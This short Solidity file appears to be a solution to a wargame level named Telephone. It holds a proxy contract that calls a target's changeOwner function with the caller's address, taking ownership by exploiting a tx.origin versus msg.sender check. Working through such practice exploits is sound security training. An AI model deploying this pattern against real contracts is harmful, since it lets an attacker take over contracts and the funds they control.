// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

// This contract does not need script automation.
// Use remix.ethereum instead.

interface Itelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneProxyContract {
    address targetContract;

    constructor(address _targetContract) {
        targetContract = _targetContract;
    }

    function makeMeOwner()public {
        Itelephone(targetContract).changeOwner(msg.sender);
    }
}